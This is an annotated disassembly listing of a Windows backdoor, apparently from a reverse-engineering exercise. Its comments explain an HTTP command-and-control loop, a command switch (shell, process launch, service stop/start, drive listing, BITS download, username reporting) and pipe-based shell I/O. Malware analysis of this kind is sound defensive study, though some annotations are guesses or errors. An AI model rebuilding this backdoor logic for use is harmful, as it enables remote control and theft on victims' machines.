.text:00401491 push    [ebp+String2]   ; int
.text:00401494 push    esi             ; char *
.text:00401495 push    [ebp+Destination] ; char *
.text:00401498 push    [ebp+Str]       ; char *
.text:0040149B push    [ebp+arg_0]     ; Str
.text:0040149E call    AllocatingAndDeletingPtrs
.text:004014A3 ;   try {
.text:004014A3 mov     [ebp+var_4], ebx
.text:004014A6
.text:004014A6 loc_4014A6:
.text:004014A6 lea     ecx, [ebp+var_5C]
.text:004014A9 call    SetUpHttp
.text:004014AE cmp     eax, ebx        ; if http set up successfully, eax = true.
.text:004014B0 jnz     short loc_4014CB ; jump if eax = true, since ebx = 0
.text:004014B2 lea     ecx, [ebp+var_5C]
.text:004014B5 call    CloseHttp
.text:004014BA push    0EA60h          ; dwMilliseconds
.text:004014BF inc     edi
.text:004014C0 call    ds:Sleep        ; sleep for one minute
.text:004014C6 cmp     edi, 5
.text:004014C9 jb      short loc_4014A6 ; loop back and try setting up http again up to 5 times
.text:004014CB
.text:004014CB loc_4014CB:
.text:004014CB cmp     edi, 5
.text:004014CE jz      loc_4018BA      ; if 5 failed attempts were made, jump, else connection was successful
.text:004014D4 push    10000h          ; unsigned int
.text:004014D9 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:004014DE mov     [ebp+Str], eax  ; allocate space for 10000h, store in [ebp + Str]
.text:004014E1 mov     [esp+290h+var_290], 1000h ; unsigned int
.text:004014E8 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:004014ED cmp     [ebp+Str], ebx  ; check if the ptr you just allocated is null
.text:004014F0 pop     ecx
.text:004014F1 mov     [ebp+String2], eax ; storing ptr to allocated space
.text:004014F4 jz      loc_4018BA      ; if ptr in [ebx + Str] is null jump
.text:004014FA cmp     eax, ebx        ;  if ptr null, jump
.text:004014FC jz      loc_4018BA
.text:00401502 push    200h            ; unsigned int
.text:00401507 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:0040150C cmp     eax, ebx        ; allocated ptr for 200h, checking if its null
.text:0040150E pop     ecx
.text:0040150F mov     [ebp+Destination], eax ; storing ptr in [ebp + Destination]
.text:00401512 jz      loc_4018BA
.text:00401518 push    0Ch
.text:0040151A lea     eax, [ebp+PipeAttributes]
.text:0040151D pop     edi
.text:0040151E mov     esi, ds:CreatePipe
.text:00401524 push    ebx             ; nSize
.text:00401525 push    eax             ; lpPipeAttributes
.text:00401526 lea     eax, [ebp+hWritePipe]
.text:00401529 mov     [ebp+PipeAttributes.nLength], edi
.text:0040152C push    eax             ; hWritePipe
.text:0040152D lea     eax, [ebp+hReadPipe]
.text:00401530 push    eax             ; hReadPipe
.text:00401531 mov     [ebp+PipeAttributes.bInheritHandle], 1
.text:00401538 mov     [ebp+PipeAttributes.lpSecurityDescriptor], ebx
.text:0040153B call    esi ; CreatePipe
.text:0040153D test    eax, eax        ; if setting up pipe was successful, eax = true
.text:0040153F jz      loc_4018B7      ; jump if pipe set up was not successful
.text:00401545 lea     eax, [ebp+var_74]
.text:00401548 push    ebx             ; nSize
.text:00401549 push    eax             ; lpPipeAttributes
.text:0040154A lea     eax, [ebp+hFile]
.text:0040154D push    eax             ; hWritePipe
.text:0040154E lea     eax, [ebp+hObject]
.text:00401551 push    eax             ; hReadPipe
.text:00401552 mov     [ebp+var_74.nLength], edi
.text:00401555 mov     [ebp+var_74.bInheritHandle], 1
.text:0040155C mov     [ebp+var_74.lpSecurityDescriptor], ebx
.text:0040155F call    esi ; CreatePipe
.text:00401561 test    eax, eax        ; check if creating pipe was successful
.text:00401563 jz      loc_4018B7      ; if creating pipe was not successful, jump
.text:00401569 lea     eax, [ebp+Buffer]
.text:0040156F push    104h            ; uSize
.text:00401574 push    eax             ; lpBuffer
.text:00401575 call    ds:GetWindowsDirectoryA ; fills buffer with path of windows directory
.text:0040157B lea     eax, [ebp+Buffer] ; copies path to eax
.text:00401581 push    offset aTasks   ; "\\tasks"
.text:00401586 push    eax             ; Destination
.text:00401587 call    strcat          ; appending \tasks to windows directory
.text:0040158C pop     ecx
.text:0040158D lea     eax, [ebp+Buffer]
.text:00401593 pop     ecx
.text:00401594 push    eax             ; lpPathName
.text:00401595 call    ds:SetCurrentDirectoryA ; set the current directory to currentdirectory\tasks
.text:0040159B push    [ebp+var_1C]    ; [ebp + var_1C] = computer name
.text:0040159E push    offset aSConnected ; "\r\n%s Connected!\r\n"
.text:004015A3 push    [ebp+Str]       ; Buffer
.text:004015A6 call    ds:sprintf      ; print " computerName connected 65536"
.text:004015AC push    [ebp+Str]       ; Str
.text:004015AF call    strlen          ; length of portNum
.text:004015B4 add     esp, 10h
.text:004015B7
.text:004015B7 loc_4015B7:             ; esi = strlen
.text:004015B7 mov     esi, eax
.text:004015B9
.text:004015B9 loc_4015B9:
.text:004015B9 xor     edi, edi
.text:004015BB cmp     dword_4047A0, ebx ; clearing out edi
.text:004015C1 jz      short loc_4015DD ; jumping if ebx is zero
.text:004015C3 cmp     esi, ebx        ; if strlen is not 0, jump
.text:004015C5 jnz     short loc_4015DD ; checking if [ebp + var_28] is empty
.text:004015C7 push    [ebp+var_30]    ; int
.text:004015CA mov     eax, [ebp+Str]
.text:004015CD push    eax             ; ExitCode
.text:004015CE mov     [eax], bl
.text:004015D0 push    [ebp+hReadPipe] ; hNamedPipe
.text:004015D3 call    PipeHandling    ; reads data from the pipe that was set up
.text:004015D8 add     esp, 0Ch
.text:004015DB mov     esi, eax
.text:004015DD
.text:004015DD loc_4015DD:             ; checking if [ebp + var_28] is empty
.text:004015DD cmp     [ebp+var_28], ebx
.text:004015E0 jnz     short loc_40160F ; jump if not empty
.text:004015E2 cmp     dword_4047A0, ebx ; if [ebp + var_28] is empty, check if dword is empty
.text:004015E8 jnz     short loc_40160F ; jump if not empty
.text:004015EA cmp     esi, ebx        ; check if pipeHandling output was empty
.text:004015EC jnz     short loc_40160F ; jump if not empty
.text:004015EE push    offset asc_4040E0 ; "$"
.text:004015F3 push    [ebp+Str]       ; Destination
.text:004015F6 call    strcpy          ; putting $ into [ebp + Str]
.text:004015FB push    [ebp+Str]       ; Str
.text:004015FE call    strlen          ; getting length of str
.text:00401603 add     esp, 0Ch
.text:00401606 mov     esi, eax        ; esi = length(str)
.text:00401608 mov     [ebp+var_28], 1 ; [ebp + var_28] = 1
.text:0040160F
.text:0040160F loc_40160F:             ; dwOptionalLength
.text:0040160F push    esi
.text:00401610 lea     ecx, [ebp+var_5C]
.text:00401613 push    [ebp+Str]       ; lpOptional
.text:00401616 call    HTTPwithCertificateCheck
.text:0040161B test    eax, eax        ; check if http request was successful
.text:0040161D jnz     short loc_401630 ; if successful, jump
.text:0040161F push    7530h           ; dwMilliseconds
.text:00401624 inc     edi
.text:00401625 call    ds:Sleep
.text:0040162B cmp     edi, 5          ; if failed, sleep 30 seconds,try again up to 5 times
.text:0040162E jbe     short loc_40160F
.text:00401630
.text:00401630 loc_401630:             ; if 5 failures occured, jump
.text:00401630 cmp     edi, 5
.text:00401633 ja      loc_4018B7
.text:00401639 mov     edi, 1000h      ; edi = 4096
.text:0040163E xor     esi, esi        ; clearing esi
.text:00401640 push    edi             ; Size
.text:00401641 push    ebx             ; Val
.text:00401642 push    [ebp+String2]   ; void *
.text:00401645 call    memset          ; setting [ebp + String2] = 0 with a buffer size of 4096
.text:0040164A add     esp, 0Ch
.text:0040164D lea     eax, [ebp+dwNumberOfBytesRead]
.text:00401650 lea     ecx, [ebp+var_5C]
.text:00401653 push    eax             ; lpdwNumberOfBytesRead
.text:00401654 push    edi             ; dwNumberOfBytesToRead
.text:00401655 push    [ebp+String2]   ; lpBuffer
.text:00401658 call    InternetReadFileSub
.text:0040165D test    eax, eax        ; check if reading file was successful
.text:0040165F jz      loc_4015B9
.text:00401665
.text:00401665 loc_401665:
.text:00401665 add     esi, [ebp+dwNumberOfBytesRead]
.text:00401668 cmp     [ebp+dwNumberOfBytesRead], ebx
.text:0040166B jz      short loc_401688 ; esi won't be zero if any bytes were read
.text:0040166D lea     eax, [ebp+dwNumberOfBytesRead]
.text:00401670 lea     ecx, [ebp+var_5C]
.text:00401673 push    eax             ; lpdwNumberOfBytesRead
.text:00401674 mov     eax, [ebp+String2]
.text:00401677 add     eax, esi
.text:00401679 push    1000h           ; dwNumberOfBytesToRead
.text:0040167E push    eax             ; lpBuffer
.text:0040167F call    InternetReadFileSub
.text:00401684 test    eax, eax        ; keep looping file until all bytes are read
.text:00401686 jnz     short loc_401665
.text:00401688
.text:00401688 loc_401688:             ; esi won't be zero if any bytes were read
.text:00401688 cmp     esi, ebx
.text:0040168A jz      loc_4015B9      ; jump if no bytes were read, loops back to top
.text:00401690 push    [ebp+String2]   ; String2
.text:00401693 push    offset String1  ; "<h1>Bad Request (Invalid Hostname)</h1>"
.text:00401698 call    ds:_strcmpi     ; check if buffer holding output from http indicates a bad request
.text:0040169E pop     ecx
.text:0040169F test    eax, eax        ; eax = 0 if strings same, nonzero if strings not the same
.text:004016A1 pop     ecx
.text:004016A2 jz      loc_4018B7      ; jump if bad request
.text:004016A8 mov     eax, [ebp+Str]
.text:004016AB mov     esi, [ebp+String2]
.text:004016AE mov     [ebp+var_28], ebx
.text:004016B1 mov     [ebp+var_30], 1
.text:004016B8 mov     [eax], bl
.text:004016BA jmp     short loc_4016BF ; esi = output buffer from Http Status
.text:004016BC
.text:004016BC loc_4016BC:
.text:004016BC mov     esi, [ebp+var_1C]
.text:004016BF
.text:004016BF loc_4016BF:             ; Str
.text:004016BF push    esi
.text:004016C0 call    removing_return_carriage_lines
.text:004016C5 push    esi             ; Source
.text:004016C6 mov     [ebp+var_1C], eax
.text:004016C9 push    [ebp+Destination] ; Destination
.text:004016CC call    strcpy          ; copy the string into destination
.text:004016D1 add     esp, 0Ch
.text:004016D4 cmp     [esi], bl       ; checking if the first char is a null char
.text:004016D6 jz      short loc_40170C
.text:004016D8 push    20h ; ' '       ; char
.text:004016DA push    ebx             ; int
.text:004016DB push    esi             ; Str
.text:004016DC xor     edi, edi        ; clear out edi
.text:004016DE call    looking_for_some_substring
.text:004016E3 add     esp, 0Ch
.text:004016E6 mov     esi, offset aShell ; "shell"
.text:004016EB
.text:004016EB loc_4016EB:             ; String2
.text:004016EB push    String2
.text:004016F1 push    esi             ; String1
.text:004016F2 call    ds:_strcmpi     ; comparing String2 to "shell"
.text:004016F8 pop     ecx
.text:004016F9 test    eax, eax        ; setting flag based on if strings are equal or not
.text:004016FB pop     ecx
.text:004016FC jz      short loc_40171B ; jump if strings are the same
.text:004016FE add     esi, 8          ; moving to the next char in the string
.text:00401701 inc     edi
.text:00401702 cmp     esi, offset aSleepTime ; "Sleep Time:"
.text:00401708 jl      short loc_4016EB
.text:0040170A jmp     short loc_40171B
.text:0040170C
.text:0040170C loc_40170C:             ; checking if ebx is still zero
.text:0040170C cmp     dword_4047A0, ebx
.text:00401712 jz      loc_40183D
.text:00401718 or      edi, 0FFFFFFFFh ; edi is all 1s now
.text:0040171B
.text:0040171B loc_40171B:             ; switch 11 cases
.text:0040171B cmp     edi, 0Ah
.text:0040171E ja      def_401724      ; jumptable 00401724 default case
.text:00401724 jmp     ds:jpt_401724[edi*4] ; switch jump
.text:0040172B
.text:0040172B loc_40172B:             ; jumptable 00401724 case 0
.text:0040172B push    [ebp+hWritePipe]
.text:0040172E push    [ebp+hObject]   ; int
.text:00401731 push    [ebp+Str]       ; Destination
.text:00401734 call    TryToStartProcessAsUser
.text:00401739 add     esp, 0Ch
.text:0040173C jmp     loc_40183D
.text:00401741
.text:00401741 loc_401741:             ; jumptable 00401724 case 1
.text:00401741 lea     eax, [ebp+var_5C]
.text:00401744 push    eax
.text:00401745 push    [ebp+Str]       ; Destination
.text:00401748 call    LoopingThroughDrives
.text:0040174D jmp     loc_40183B
.text:00401752
.text:00401752 loc_401752:             ; jumptable 00401724 case 2
.text:00401752 lea     eax, [ebp+var_5C]
.text:00401755 push    eax
.text:00401756 push    [ebp+Str]       ; Destination
.text:00401759 call    StopService
.text:0040175E jmp     loc_40183B
.text:00401763
.text:00401763 loc_401763:             ; jumptable 00401724 cases 3,4
.text:00401763 mov     eax, [ebp+arg_0]
.text:00401766 push    ebx             ; lpThreadId
.text:00401767 push    ebx             ; dwCreationFlags
.text:00401768 mov     dword_404794, eax
.text:0040176D push    [ebp+Str]       ; lpParameter
.text:00401770 push    offset StartAddress ; lpStartAddress
.text:00401775 push    ebx             ; dwStackSize
.text:00401776 push    ebx             ; lpThreadAttributes
.text:00401777 call    ds:CreateThread ; creates thread to execute
.text:0040177D mov     esi, eax        ; esi = handle to thread
.text:0040177F push    0FFFFFFFFh      ; dwMilliseconds
.text:00401781 push    esi             ; hHandle
.text:00401782 call    ds:WaitForSingleObject ; waiting until hHandle is in signaled state
.text:00401788 push    esi             ; hObject
.text:00401789 call    ds:CloseHandle  ; close the handle
.text:0040178F jmp     loc_40183D
.text:00401794
.text:00401794 loc_401794:             ; jumptable 00401724 case 5
.text:00401794 lea     eax, [ebp+var_5C]
.text:00401797 push    eax
.text:00401798 push    [ebp+Str]       ; Destination
.text:0040179B call    StartService
.text:004017A0 jmp     loc_40183B
.text:004017A5
.text:004017A5 loc_4017A5:             ; jumptable 00401724 case 6
.text:004017A5 lea     eax, [ebp+nSize]
.text:004017A8 mov     [ebp+nSize], 101h
.text:004017AF push    eax             ; nSize
.text:004017B0 lea     eax, [ebp+NameBuffer]
.text:004017B6 push    eax             ; lpNameBuffer
.text:004017B7 push    2               ; NameFormat
.text:004017B9 call    GetUserNameExA  ; returns name of user associated with calling thread, stored in lpNameBuffer
.text:004017BE lea     eax, [ebp+NameBuffer]
.text:004017C4 push    eax             ; Source
.text:004017C5 push    [ebp+Str]       ; Destination
.text:004017C8 call    strcat
.text:004017CD push    offset asc_4040B4 ; "\r\n"
.text:004017D2 push    [ebp+Str]       ; Destination
.text:004017D5 call    strcat          ; concatenating source and destination with new line/carriage return
.text:004017DA add     esp, 10h
.text:004017DD jmp     short loc_40183D
.text:004017DF
.text:004017DF loc_4017DF:             ; jumptable 00401724 case 8
.text:004017DF push    offset a20111117
.text:004017E4 jmp     short loc_401833
.text:004017E6
.text:004017E6 loc_4017E6:             ; jumptable 00401724 case 9
.text:004017E6 lea     eax, [ebp+var_5C]
.text:004017E9 push    eax
.text:004017EA push    [ebp+Str]       ; Destination
.text:004017ED call    CallsCreateProcessInSwitchStatement
.text:004017F2 jmp     short loc_40183B
.text:004017F4
.text:004017F4 loc_4017F4:             ; jumptable 00401724 case 10
.text:004017F4 lea     eax, [ebp+var_5C]
.text:004017F7 push    eax
.text:004017F8 push    [ebp+Str]       ; Destination
.text:004017FB call    DownloadBitsToFile
.text:00401800 jmp     short loc_40183B
.text:00401802
.text:00401802 def_401724:             ; jumptable 00401724 default case
.text:00401802 cmp     dword_4047A0, ebx
.text:00401808 jz      short loc_40182E
.text:0040180A push    offset asc_4040B4 ; "\r\n"
.text:0040180F push    [ebp+Destination] ; Destination
.text:00401812 call    strcat          ; concatenate \r\n to destination
.text:00401817 push    [ebp+hFile]     ; hFile
.text:0040181A push    [ebp+Destination] ; Str
.text:0040181D call    WritingToFile
.text:00401822 add     esp, 10h
.text:00401825 mov     [ebp+var_30], 1
.text:0040182C jmp     short loc_40183D
.text:0040182E
.text:0040182E loc_40182E:
.text:0040182E push    offset aStartShellFirs ; "Start shell first.\r\n"
.text:00401833
.text:00401833 loc_401833:             ; Destination
.text:00401833 push    [ebp+Str]
.text:00401836 call    strcat
.text:0040183B
.text:0040183B loc_40183B:
.text:0040183B pop     ecx
.text:0040183C pop     ecx
.text:0040183D
.text:0040183D loc_40183D:
.text:0040183D mov     eax, [ebp+var_1C]
.text:00401840 cmp     [eax], bl
.text:00401842 jnz     loc_4016BC
.text:00401848 push    [ebp+Str]       ; Str
.text:0040184B call    strlen
.text:00401850 pop     ecx
.text:00401851 jmp     loc_4015B7      ; esi = strlen
.text:00401856
.text:00401856 loc_401856:             ; jumptable 00401724 case 7
.text:00401856 push    offset aSleepTime
.text:0040185B lea     ecx, [ebp+var_5C]
.text:0040185E call    SettingUpHttpToSendBackInfo
.text:00401863
.text:00401863 loc_401863:             ; Str
.text:00401863 push    offset szReferrer
.text:00401868 lea     ecx, [ebp+var_5C]
.text:0040186B call    SettingUpHttpToSendBackInfo
.text:00401870 lea     eax, [ebp+dwNumberOfBytesRead]
.text:00401873 lea     ecx, [ebp+var_5C]
.text:00401876 push    eax             ; lpdwNumberOfBytesRead
.text:00401877 push    1000h           ; dwNumberOfBytesToRead
.text:0040187C push    [ebp+String2]   ; lpBuffer
.text:0040187F call    InternetReadFileSub
.text:00401884 mov     eax, [ebp+dwNumberOfBytesRead]
.text:00401887 cmp     eax, ebx        ; checking if dwBytesRead is empty
.text:00401889 jz      short loc_401863 ; jump if bytesRead = 0
.text:0040188B mov     ecx, [ebp+String2]
.text:0040188E push    ecx             ; String
.text:0040188F mov     [eax+ecx], bl
.text:00401892 call    ds:atoi         ; converting String2 to int
.text:00401898 cmp     eax, ebx        ; checking if String2 = 0
.text:0040189A pop     ecx
.text:0040189B mov     [ebp+nSize], eax
.text:0040189E jz      short loc_4018A5 ; jump if String2 = 0
.text:004018A0 mov     dword_4046B4, eax ; dword = String2 as int
.text:004018A5
.text:004018A5 loc_4018A5:             ; hFile
.text:004018A5 push    [ebp+hFile]
.text:004018A8 lea     eax, [ebp+var_5C]
.text:004018AB push    eax             ; int
.text:004018AC push    [ebp+Str]       ; Destination
.text:004018AF call    AttemptHTTPSetup ; sending status data back to mal
.text:004018B4 add     esp, 0Ch
.text:004018B7
.text:004018B7 loc_4018B7:
.text:004018B7 mov     esi, [ebp+var_34]
.text:004018BA
.text:004018BA loc_4018BA:
.text:004018BA cmp     dword_4047A0, ebx
.text:004018C0 jz      short loc_4018DD ; checking if the pipe is still running
.text:004018C2 push    ebx             ; uExitCode
.text:004018C3 push    hObject         ; hProcess
.text:004018C9 call    ds:TerminateProcess
.text:004018CF push    0FFFFFFFFh      ; dwMilliseconds
.text:004018D1 push    hObject         ; hHandle
.text:004018D7 call    ds:WaitForSingleObject ; If the pipe isn't closed then we close it and wait for it to close
.text:004018DD
.text:004018DD loc_4018DD:
.text:004018DD lea     ecx, [ebp+var_5C]
.text:004018E0 call    CloseHttp       ; closing the http handle
.text:004018E5 cmp     [ebp+Str], ebx  ; checking if the string is a null pointer
.text:004018E8 jz      short loc_4018F3
.text:004018EA push    [ebp+Str]       ; void *
.text:004018ED call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:004018F2 pop     ecx             ; if the string isn't empty then we free the memory
.text:004018F3
.text:004018F3 loc_4018F3:
.text:004018F3 cmp     [ebp+String2], ebx
.text:004018F6 jz      short loc_401901 ; checking if string2 is empty
.text:004018F8 push    [ebp+String2]   ; void *
.text:004018FB call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401900 pop     ecx             ; if it isn't empty then we free it
.text:00401901
.text:00401901 loc_401901:             ; deleating the memory for the buffer
.text:00401901 push    esi
.text:00401902 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401907 cmp     [ebp+Destination], ebx ; checking if it is a null pointer
.text:0040190A pop     ecx
.text:0040190B jz      short loc_401916
.text:0040190D push    [ebp+Destination] ; void *
.text:00401910 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401915 pop     ecx             ; freeing the memory if it is not a null pointer
.text:00401916
.text:00401916 loc_401916:             ; hObject
.text:00401916 push    hObject
.text:0040191C mov     esi, ds:CloseHandle ; closing both of the pipes
.text:00401922 call    esi ; CloseHandle
.text:00401924 push    dword_404774    ; hObject
.text:0040192A call    esi ; CloseHandle
.text:0040192C or      edi, 0FFFFFFFFh
.text:0040192F cmp     [ebp+hReadPipe], edi ; checking if the read pipe is all 1s
.text:00401932 jz      short loc_401939
.text:00401934 push    [ebp+hReadPipe] ; hObject
.text:00401937 call    esi ; CloseHandle ; if it isn't then we close that pipe too
.text:00401939
.text:00401939 loc_401939:
.text:00401939 cmp     [ebp+hWritePipe], edi
.text:0040193C jz      short loc_401943 ; check if the write pipe is closed already
.text:0040193E push    [ebp+hWritePipe] ; hObject
.text:00401941 call    esi ; CloseHandle ; if it isn't then we close it
.text:00401943
.text:00401943 loc_401943:
.text:00401943 cmp     [ebp+hObject], edi
.text:00401946 jz      short loc_40194D ; checking if it's closed
.text:00401948 push    [ebp+hObject]   ; hObject
.text:0040194B call    esi ; CloseHandle ; if it isn't closed then we close it
.text:0040194D
.text:0040194D loc_40194D:
.text:0040194D cmp     [ebp+hFile], edi
.text:00401950 jz      short loc_401957 ; checking if its closed
.text:00401952 push    [ebp+hFile]     ; hObject
.text:00401955 call    esi ; CloseHandle ; if it's not closed then we close it
.text:00401957
.text:00401957 loc_401957:
.text:00401957 lea     ecx, [ebp+var_5C]
.text:00401957 ;   } // starts at 4014A3
.text:0040195A mov     [ebp+var_4], edi
.text:0040195D call    NearEnd
.text:00401962
.text:00401962 loc_401962:
.text:00401962 mov     ecx, [ebp+var_C]
.text:00401965 pop     edi
.text:00401966 pop     esi             ; cleaning up stack
.text:00401967 xor     eax, eax        ; zeroing eax
.text:00401969 pop     ebx
.text:0040196A mov     large fs:0, ecx ; writing var5c to the thread information block
.text:00401971 leave
.text:00401972 retn
.text:00401972 ; } // starts at 401406
.text:00401972 ThickBoi endp
.text:00401972
.text:00401973 jpt_401724 dd offset loc_40172B ; jump table for switch statement
.text:00401973 dd offset loc_401741
.text:00401973 dd offset loc_401752
.text:00401973 dd offset loc_401763
.text:00401973 dd offset loc_401763
.text:00401973 dd offset loc_401794
.text:00401973 dd offset loc_4017A5
.text:00401973 dd offset loc_401856
.text:00401973 dd offset loc_4017DF
.text:00401973 dd offset loc_4017E6
.text:00401973 dd offset loc_4017F4
.text:0040199F
.text:0040199F
.text:0040199F ; Attributes: bp-based frame
.text:0040199F
.text:0040199F ; int __cdecl WritingToFile(char *Str, HANDLE hFile)
.text:0040199F WritingToFile proc near
.text:0040199F
.text:0040199F Str= dword ptr  8
.text:0040199F hFile= dword ptr  0Ch
.text:0040199F
.text:0040199F push    ebp
.text:004019A0 mov     ebp, esp
.text:004019A2 push    esi
.text:004019A3 mov     esi, [ebp+Str]  ; esi = Str
.text:004019A6 test    esi, esi        ; checking if Str is empty
.text:004019A8 jz      short loc_4019E8 ; if Str is empty, jump
.text:004019AA push    esi             ; Str
.text:004019AB call    strlen          ; if Str isn't empty, get length
.text:004019B0 test    eax, eax        ; testing if length is 0
.text:004019B2 pop     ecx
.text:004019B3 jz      short loc_4019E8 ; jump if length is 0
.text:004019B5 push    esi             ; Str
.text:004019B6 call    strlen          ; getting length of string again?
.text:004019BB pop     ecx
.text:004019BC and     [ebp+Str], 0    ; clearing out [ebp + Str]
.text:004019C0 lea     ecx, [ebp+Str]  ; ecx = empty, WriteFile sets to zero before doing any work. Use NULL if asynchronous
.text:004019C3 push    0               ; lpOverlapped
.text:004019C5 push    ecx             ; lpNumberOfBytesWritten
.text:004019C6 push    eax             ; nNumberOfBytesToWrite
.text:004019C7 push    esi             ; lpBuffer
.text:004019C8 push    [ebp+hFile]     ; hFile
.text:004019CB call    ds:WriteFile    ; write to file "hFile" whatever is in Str, aka lpBuffer
.text:004019D1 test    eax, eax        ; check if writing function succeeded
.text:004019D3 setnz   al              ; sets byte in al to 1 if zero flag is clear, else 0
.text:004019D6 cmp     [ebp+Str], 0    ; checking if str is empty
.text:004019DA jz      short loc_4019E8 ; jump if str is empty
.text:004019DC test    al, al          ; check if al is 0
.text:004019DE jz      short loc_4019E8 ; jump if it is 0
.text:004019E0 push    64h ; 'd'       ; dwMilliseconds
.text:004019E2 call    ds:Sleep        ; sleep for 100ms
.text:004019E8
.text:004019E8 loc_4019E8:
.text:004019E8 pop     esi
.text:004019E9 pop     ebp
.text:004019EA retn
.text:004019EA WritingToFile endp
.text:004019EA
.text:004019EB
.text:004019EB
.text:004019EB
.text:004019EB ; int __cdecl removing_return_carriage_lines(char *Str)
.text:004019EB removing_return_carriage_lines proc near
.text:004019EB
.text:004019EB Str= dword ptr  4
.text:004019EB
.text:004019EB push    edi
.text:004019EC mov     edi, [esp+4+Str] ; the output buffer from HTTP with status
.text:004019F0 test    edi, edi        ; checking if [esp+4+Str] is an empty string
.text:004019F2 jnz     short loc_4019F8 ; jump if string isn't empty
.text:004019F4 xor     eax, eax
.text:004019F6 pop     edi             ; return 0 if string is empty
.text:004019F7 retn
.text:004019F8
.text:004019F8 loc_4019F8:
.text:004019F8 push    esi
.text:004019F9 push    edi             ; Str
.text:004019FA xor     esi, esi        ; clear out esi
.text:004019FC call    strlen          ; get length of string
.text:00401A01 test    eax, eax        ; check if string length is 0
.text:00401A03 pop     ecx
.text:00401A04 jbe     short loc_401A1C ; jump if string length is 0
.text:00401A06
.text:00401A06 loc_401A06:
.text:00401A06 mov     cl, [esi+edi]
.text:00401A09 test    cl, cl          ; check if [esp + 4 + str] is empty
.text:00401A0B jz      short loc_401A1C
.text:00401A0D cmp     cl, 0Dh         ; jump if cl = 13
.text:00401A10 jz      short loc_401A1C ; looking for a carriage return
.text:00401A12 cmp     cl, 0Ah         ; jump if cl = 10
.text:00401A15 jz      short loc_401A1C ; if it's a new line then we can exit this loop
.text:00401A17 inc     esi
.text:00401A18 cmp     esi, eax        ; iterate over this until esi = string length
.text:00401A1A jb      short loc_401A06
.text:00401A1C
.text:00401A1C loc_401A1C:             ; checking to see if the last character is a carriage return
.text:00401A1C cmp     byte ptr [esi+edi], 0Dh
.text:00401A20 jnz     short loc_401A28
.text:00401A22 and     byte ptr [esi+edi], 0
.text:00401A26 inc     esi             ; if [esi+edi] is equal to a carriage return then we clear out that part of memory and increment the memory pointer by 2 bytes
.text:00401A27 inc     esi
.text:00401A28
.text:00401A28 loc_401A28:
.text:00401A28 lea     eax, [esi+edi]
.text:00401A2B pop     esi
.text:00401A2C pop     edi
.text:00401A2D retn
.text:00401A2D removing_return_carriage_lines endp
.text:00401A2D
.text:00401A2E
.text:00401A2E
.text:00401A2E ; Attributes: bp-based frame
.text:00401A2E
.text:00401A2E ; int __cdecl looking_for_some_substring(char *Str, int, char)
.text:00401A2E looking_for_some_substring proc near
.text:00401A2E
.text:00401A2E var_8= dword ptr -8
.text:00401A2E var_4= dword ptr -4
.text:00401A2E Str= dword ptr  8
.text:00401A2E arg_4= dword ptr  0Ch
.text:00401A2E arg_8= byte ptr  10h
.text:00401A2E
.text:00401A2E push    ebp
.text:00401A2F mov     ebp, esp        ; setting up the stack
.text:00401A31 push    ecx
.text:00401A32 push    ecx
.text:00401A33 mov     eax, [ebp+arg_4] ; eax has what used to be in ebx which I think is zero
.text:00401A36 push    ebx
.text:00401A37 push    esi
.text:00401A38 xor     esi, esi        ; clearing esi
.text:00401A3A cmp     eax, esi
.text:00401A3C push    edi
.text:00401A3D mov     [ebp+var_8], esi ; initializing local vars to zero
.text:00401A40 mov     [ebp+var_4], esi
.text:00401A43 jnz     short loc_401A4E ; checking if the old value of ebx is zero
.text:00401A45 push    [ebp+Str]       ; Str
.text:00401A48 call    strlen
.text:00401A4D pop     ecx             ; eax has the string length
.text:00401A4E
.text:00401A4E loc_401A4E:             ; bl = 20h
.text:00401A4E mov     bl, [ebp+arg_8]
.text:00401A51 mov     [ebp+arg_4], eax ; arg4 is the string length
.text:00401A54 push    8
.text:00401A56 mov     edx, offset String2 ; string2 stores a zero
.text:00401A5B xor     eax, eax        ; clear eax
.text:00401A5D pop     ecx             ; ecx = 8
.text:00401A5E cmp     [ebp+arg_4], eax ; checks if the string length is zero
.text:00401A61 mov     edi, edx
.text:00401A63 rep stosd
.text:00401A65 jbe     short loc_401ABD
.text:00401A67
.text:00401A67 loc_401A67:
.text:00401A67 mov     edi, [ebp+Str]
.text:00401A6A mov     cl, [esi+edi]   ; esi starts at zero and we iterate through the string
.text:00401A6D lea     eax, [esi+edi]
.text:00401A70 cmp     cl, bl          ; looking for spaces in the string
.text:00401A72 jz      short loc_401A8E
.text:00401A74 cmp     [ebp+var_4], 0  ; checking if var4 has been set which it has for every char that is not directly after a carriage return
.text:00401A78 jnz     short loc_401A8E
.text:00401A7A cmp     cl, 22h ; '"'   ; checking if the current char is a quotation mark
.text:00401A7D mov     [ebp+var_4], 1  ; var4 equals 1 if it wasn't already set
.text:00401A84 jnz     short loc_401A89
.text:00401A86 mov     bl, cl          ; bl is now the current char if it's not a space or quotation
.text:00401A88 inc     esi             ; checking the next char if it's not a quotation
.text:00401A89
.text:00401A89 loc_401A89:
.text:00401A89 lea     eax, [esi+edi]
.text:00401A8C mov     [edx], eax      ; string2 is equal to a pointer to the next char
.text:00401A8E
.text:00401A8E loc_401A8E:             ; cl stores the current char because eax is a pointer to the current char
.text:00401A8E mov     cl, [eax]
.text:00401A90 cmp     cl, bl
.text:00401A92 jz      short loc_401A99
.text:00401A94 cmp     cl, 0Dh         ; looking for a carriage return
.text:00401A97 jnz     short loc_401AB7
.text:00401A99
.text:00401A99 loc_401A99:
.text:00401A99 cmp     [ebp+var_4], 0
.text:00401A9D jz      short loc_401AB7
.text:00401A9F and     [ebp+var_4], 0  ; rezeroes var4 if it was set
.text:00401AA3 and     byte ptr [eax], 0
.text:00401AA6 inc     [ebp+var_8]
.text:00401AA9 mov     bl, [ebp+arg_8] ; bl goes back to being a space
.text:00401AAC add     edx, 4
.text:00401AAF cmp     edx, offset dword_4047A0
.text:00401AB5 jz      short loc_401AC6
.text:00401AB7
.text:00401AB7 loc_401AB7:
.text:00401AB7 inc     esi
.text:00401AB8 cmp     esi, [ebp+arg_4] ; checking if we got to the end of the string
.text:00401ABB jb      short loc_401A67
.text:00401ABD
.text:00401ABD loc_401ABD:
.text:00401ABD mov     eax, [ebp+var_8]
.text:00401AC0 inc     eax             ; eax is equal to 1 if the string length is zero
.text:00401AC1
